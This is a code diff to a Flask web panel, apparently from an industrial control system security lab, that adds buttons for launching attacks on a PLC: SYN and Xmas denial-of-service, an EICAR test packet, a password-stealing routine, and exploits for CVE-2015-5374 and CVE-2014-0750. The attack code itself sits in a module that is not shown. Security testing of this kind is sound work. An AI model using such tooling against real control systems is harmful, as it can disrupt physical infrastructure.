@@ -1,5 +1,4 @@
 from flask import Flask, render_template, request
-import time
 import logging
 from concurrent_log_handler import ConcurrentRotatingFileHandler
 from lib import attack
@@ -48,11 +47,6 @@ def read_log():
     return log_content
 
 
-@app.route('/settings')
-def show_settings_page():
-    return render_template('settings.html')
-
-
 @app.route('/attack/plc/modbus/disable', methods=['POST'])
 def execute_modbus_disable():
     logger.info('[Modbus attack: Disable] ' + attack.mb_stop(IP_PLC))
@@ -71,6 +65,52 @@ def execute_modbus_disrupt():
 def execute_modbus_restore():
     logger.info('[Modbus attack: Restore] ' + attack.mb_restore(IP_PLC))
     logger.info('[Modbus attack: Restore] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/dos/tcp-syn', methods=['POST'])
+def execute_dos_tcp_syn():
+    logger.info('[DoS attack: TCP Syn] ' + attack.dos_syn(IP_PLC))
+    logger.info('[DoS attack: TCP Syn] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/dos/tcp-xmas', methods=['POST'])
+def execute_dos_tcp_xmas():
+    logger.info('[DoS attack: TCP Xmas] ' + attack.dos_xmas(IP_PLC))
+    logger.info('[DoS attack: TCP Xmas] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/malware/eicar', methods=['POST'])
+def execute_malware_eicar():
+    logger.info('[Malware: EICAR] Sending EICAR malware test packet to target'
+                + attack.malware_eicar(IP_PLC))
+    logger.info('[Malware: EICAR] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/malware/passwd', methods=['POST'])
+def execute_malware_passwd():
+    logger.info('[Malware: Steal password] Trying to retrieve password from target'
+                + attack.malware_passwd(IP_PLC))
+    logger.info('[Malware: Steal password] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/cve/2015-5374', methods=['POST'])
+def execute_cve_2015_5374():
+    logger.info('[Exploit: CVE-2015-5374] Exploiting Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module '
+                '< V4.25' + attack.cve_2015_5374(IP_PLC))
+    logger.info('[Exploit: CVE-2015-5374] DONE')
+    return render_template('index.html')
+
+
+@app.route('/attack/cve/2014-0750', methods=['POST'])
+def execute_cve_2014_0705():
+    logger.info('[Exploit: CVE-2014-0750] Exploiting GE Proficy CIMPLICITY HMI - Remote Code Execution'
+                + attack.cve_2014_0750(IP_PLC))
+    logger.info('[Exploit: CVE-2014-0750] DONE')
     return render_template('index.html')
 
 
